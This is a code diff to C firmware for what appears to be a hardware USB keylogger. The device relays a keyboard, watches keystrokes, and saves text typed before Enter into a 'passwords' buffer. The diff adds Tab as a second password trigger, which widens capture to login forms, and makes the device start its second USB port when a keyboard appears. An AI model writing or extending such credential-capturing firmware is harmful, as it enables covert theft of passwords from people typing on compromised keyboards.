@@ -24,15 +24,17 @@
  * variables
  */
 static uint16_t inputs[NB_INPUT];
-static int      input_timer = -1;
-int             input_index = 0;
+static int      input_timer     = -1;
+static int      input_index     = 0;
+static int      password_index  = 0;
+static int      nb_char_pressed = 0;
 
-static int nb_char_pressed = 0;
-uint8_t    led_status      = 7;
-
+uint8_t  led_status = 7;
 uint16_t passwords[PASSWORD_BUFFER_SIZE];
-int      password_index = 0;
 
+/*
+ * Mailbox
+ */
 mailbox_t umb;
 msg_t     umb_buffer[MB_SIZE];
 MAILBOX_DECL(umb, umb_buffer, MB_SIZE);
@@ -107,6 +109,9 @@ static void ThreadUsbhMainLoop(void *p)
     chRegSetThreadName("USBH");
 
     for(;;) {
+        //start USB_OTG2 when the keyboard is detected for the first time
+        if(USBHHIDD->state == USBHHID_STATE_READY && USBD2.state == USB_STOP)
+            usb_start(&USBHD1);
         usbhMainLoop(&USBHD1);
         chThdSleepMilliseconds(50);
     }
@@ -162,7 +167,7 @@ static void store_lasts_inputs(int size)
     password_index += size;
 }
 
-void usbh_detector(char input)
+static void usbh_detector(char input)
 {
     if(password_index + PASSWORD_MAX_SIZE > PASSWORD_BUFFER_SIZE) {  // avoid max password buffer
         rtt_printf("[WARNING] Password buffer full\n");
@@ -180,6 +185,7 @@ void usbh_detector(char input)
             nb_char_pressed = 0;
             break;
         case '\n':  // password is expected
+        case '\t':  // password is expected
             rtt_printf("[enter] detected\n");
             if(nb_char_pressed > PASSWORD_MAX_SIZE)
                 nb_char_pressed = PASSWORD_MAX_SIZE;
